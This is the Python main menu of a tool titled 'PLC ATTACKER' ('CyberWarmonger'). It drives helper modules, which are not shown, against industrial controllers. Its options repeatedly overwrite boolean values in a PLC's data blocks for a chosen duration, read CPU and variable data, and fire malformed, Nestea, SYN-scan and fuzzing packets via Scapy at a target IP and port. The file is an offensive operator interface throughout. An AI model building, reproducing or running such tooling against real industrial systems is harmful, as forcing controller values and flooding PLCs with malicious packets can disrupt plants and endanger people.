# main2.py

from PLCDataInfo import PLCDataInfo
from PLCDataWriter import PLCDataWriter
from PLCDataCollector import PLCDataCollector
from PLCScapyPacket import PLCScapyPacket
import time
import random

def main():
    while True:
        print("                  PLC ATTACKER                  ")
        print("-------------------------------------------------------")
        print("-------------------------------------------------------")
        print("                    CyberWarmonger                     ")
        print("Select an option:\n")
        print("1. PLC Data Change")
        print("2. PLC Data Info")
        print("3. PLC Data Collector")
        print("4. PLC Packet injection Attack")
        print("5. Quit\n")

        choice = input("Enter your choice: ")

        if choice == "1":
            print("\n----------------------------------")
            print("1. PLC Data Change was selected")
            print("----------------------------------\n")
          
            ip_address = input("Enter the PLC IP address: ")
            db_number = int(input("Enter the DB number: "))
            start_offset = int(input("Enter the start offset: "))
            bit_offset = int(input("Enter the bit offset: "))
            time_running = int(input("Enter the running time: "))
            plc_data_writer = PLCDataWriter(ip_address, db_number)

            try:
                while True:
                    user_input = input("Enter 'True' or 'False' to change the value: ")
                    if user_input.lower() == 'true':
                        value_to_set = True
                    elif user_input.lower() == 'false':
                        value_to_set = False
                    else:
                        print("Invalid input. Please enter 'True' or 'False'.")
                        continue

                    start_time = time.time()
                    while time.time() - start_time < time_running:
                        plc_data_writer.writeBool(db_number, start_offset, bit_offset, int(value_to_set))
                        time.sleep(1) 

                    user_choice = input("Do you want to change the value again? (Y/N): ")
                    if user_choice.lower() != 'y':
                        break  
                plc_data_writer.close_connection()

            except KeyboardInterrupt:
                plc_data_writer.close_connection()


        elif choice == "2":
            print("\n----------------------------------")
            print("2. PLC Data Info was selected")
            print("----------------------------------\n")
           
            ip_address = input("Enter the PLC IP address: ")
            plc_number = int(input("Enter the PLC number: "))
            print("-------------------------------------\n")
            print("---------------------------------------")
            plc_data_info = PLCDataInfo(ip_address, plc_number)
            
            try:
                plc_data_info.read_cpu_info()
            except KeyboardInterrupt:
                plc_data_info.close_connection()
            time.sleep(3)

        elif choice == "3":
            print("\n----------------------------------")
            print("3. PLC Data Collector was selected")
            print("----------------------------------\n")
            
            ip_address = input("Enter the PLC IP address: ")
            db_number = int(input("Enter the DB number: "))
            plc_number = int(input("Enter the PLC number: "))
           
            start_offset = 0
            bit_offset = 0 

            plc_data_get = PLCDataCollector(ip_address, plc_number, db_number, start_offset, bit_offset)
            
            value = 1  
            num_items = 190
            data_types = [
                'UInt',  
                'UInt',  
                'Bool',  
                'Word',  
                'LTime',  
          
            ]
            plc_data_get = PLCDataCollector(ip_address, plc_number, db_number, start_offset, bit_offset)

            

            try:
                plc_data_get.read_cpu_info()
                data_values = plc_data_get.read_variables(1, len(data_types), data_types)
                plc_data_get.read_boolean_variables(1, num_items)
            except KeyboardInterrupt:
                plc_data_get.close_connection()


        elif choice == "4":
            print("\n----------------------------------")
            print("4. PLC Packet injection Attack was selected")
            print("----------------------------------\n")
            
            source_ip = input("Enter the source IP: ")
            destination_ip = input("Enter the destination IP: ")
            source_port = int(input("Enter the source port: "))
            destination_port = int(input("Enter the destination port: "))
            plc_packet_send = PLCScapyPacket(source_ip, destination_ip, source_port, destination_port)

            

            while True:
                print("\n----------------------------------")
                print("Select a Scapy Packet function:")
                print("----------------------------------\n")
                print("1. Send TCP Malicious Packet")
                print("2. Send UDP Malicious Packet")
                print("3. Send Malformed Malicious Packet")
                print("4. Send Nestea Malicious Packet")
                print("5. Send Malformed & Nestea & Syn Scans  \n & Fuzzing Packet Malicious")
                print("6. Quit Scapy Packet\n")

                scapy_choice = input("Enter your choice: ")
                if scapy_choice == "1":
                    print("\n----------------------------------")
                    print("1. Send TCP Packet was selected")
                    print("----------------------------------\n")
                    count = int(input("Enter the count: "))
                    plc_packet_send.packet_send_protocol("TCP", count)

                elif scapy_choice == "2":
                    print("\n----------------------------------")
                    print("2. Send UDP Packet was selected")
                    print("----------------------------------\n")
                    count = int(input("Enter the count: "))
                    plc_packet_send.packet_send_protocol("UDP", count)

                elif scapy_choice == "3":
                    print("\n----------------------------------")
                    print("3. Send Malformed Packet was selected")
                    print("----------------------------------\n")
                    count = int(input("Enter the count: "))
                    plc_packet_send.malformed_packets(count)

                elif scapy_choice == "4":
                    print("\n----------------------------------")
                    print("4. Send Nestea Attack Packet was selected")
                    print("----------------------------------\n")
                    count = int(input("Enter the count: "))
                    plc_packet_send.nestea_attack(count)

                elif scapy_choice == "5":
                    print("\n----------------------------------")
                    print("5. Send Malformed & Nestea & Syn Scans \n & Fuzzing Packet"
                          " was selected")
                    print("----------------------------------\n")
                    count = int(input("Enter the count: "))
                    for i in range(0, count):
                        print(i)
                        
                        plc_packet_send.malformed_packets(1)
                        print("Malformed Packet was injected successfully")
                        plc_packet_send.nestea_attack(1)
                        print("Nestea Packet was injected successfully")
                        plc_packet_send.syn_Scans(1)
                        print("Syn Scan Packet was injected successfully")
                        plc_packet_send.fuzzing(1)
                        print("Syn Fuzzing Packet was injected successfully")

                elif scapy_choice == "6":
                    break

                else:

                    print("Invalid choice. Please select a valid option.")


        elif choice == "5":
            print("Goodbye!")
            break

        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
